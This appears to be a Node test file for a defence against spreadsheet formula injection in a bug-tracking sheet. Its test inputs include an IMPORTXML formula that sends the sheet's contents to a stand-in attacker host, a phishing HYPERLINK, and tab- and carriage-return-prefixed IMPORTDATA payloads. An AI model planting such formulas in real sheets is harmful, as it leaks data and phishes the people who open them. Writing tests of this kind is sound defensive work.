import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import path from "node:path";
import test from "node:test";

// support-sheets.ts imports googleapis at module scope, which is far too heavy
// to pull into the test run for one pure string function. So this reads the
// source and exercises the real regex literal out of it - a source-shape test
// that still fails on a weakened character class, not just on a deleted call.
const source = readFileSync(
  path.join(process.cwd(), "src/lib/support-sheets.ts"),
  "utf8",
);

function sheetTextFromSource() {
  const match = source.match(
    /function sheetText\(value: string\): string \{\s*return (\/.+?\/)\.test\(value\)/,
  );
  assert.ok(match, "sheetText must stay a single regex test - update this test if it grows");
  const re = new RegExp(match[1].slice(1, -1));
  return (value) => (re.test(value) ? `'${value}` : value);
}

// The board is written with valueInputOption "USER_ENTERED" because columns A
// and H are deliberately =HYPERLINK formulas. That setting is per-request, not
// per-cell, so it also parses the reporter's free text in C and D - and
// POST /api/support/ticket is open to signed-out visitors on purpose.
test("a formula typed into a bug report is not left executable", () => {
  const sheetText = sheetTextFromSource();

  // The exfiltration case: reads the whole board and ships it to the attacker
  // the moment a triager opens the sheet.
  const exfil = '=IMPORTXML("https://attacker.example/?d="&CONCATENATE(A1:J500),"//a")';
  assert.equal(sheetText(exfil), `'${exfil}`);

  // The phishing case - wears the same styling as the two links we put there.
  assert.equal(
    sheetText('=HYPERLINK("https://attacker.example","screenshot")'),
    `'=HYPERLINK("https://attacker.example","screenshot")`,
  );

  // Every formula leader Sheets honours, not just "=".
  for (const lead of ["=", "+", "-", "@"]) {
    assert.equal(sheetText(`${lead}cmd`), `'${lead}cmd`, `${lead} must be neutralised`);
  }

  // A leading tab or CR walks a formula past a check that only looks for "=".
  assert.equal(sheetText("\t=IMPORTDATA(\"https://attacker.example\")"), "'\t=IMPORTDATA(\"https://attacker.example\")");
  assert.equal(sheetText("\r=IMPORTDATA(\"https://attacker.example\")"), "'\r=IMPORTDATA(\"https://attacker.example\")");
});

test("ordinary bug reports are left exactly as typed", () => {
  const sheetText = sheetTextFromSource();
  for (const ordinary of [
    "The RSVP button does nothing on iOS",
    "",
    "2 + 2 renders as 5",
    "price shows $12-14 instead of $12",
    "email me at sam@example.com",
  ]) {
    assert.equal(sheetText(ordinary), ordinary, `must not touch: ${ordinary}`);
  }
});

test("every reporter-supplied cell stays wrapped", () => {
  // These are the three writes that carry reporter text under USER_ENTERED.
  // A new one added without sheetText is the regression this catches.
  assert.match(source, /sheetText\(input\.whatIsWrong\)/, "appendBugRow column C");
  assert.match(source, /sheetText\(input\.expected\)/, "appendBugRow column D");
  assert.match(source, /sheetText\(input\.role\)/, "appendBugRow column B");
  assert.match(
    source,
    /values: \[\[sheetText\(whatIsWrong\), sheetText\(expected\)\]\]/,
    "updateBugRowContent C:D",
  );
  assert.match(source, /values: \[\[sheetText\(message\)\]\]/, "markBugRowNotFixed C");
});

test("the sheet still parses the two links it is supposed to parse", () => {
  // The fix must not have been "switch everything to RAW" - that would have
  // turned the URL and screenshot columns into literal =HYPERLINK text.
  assert.match(source, /valueInputOption: "USER_ENTERED"/);
  assert.match(source, /=HYPERLINK\("\$\{sheetStr\(urlDisplay\)\}/);
});
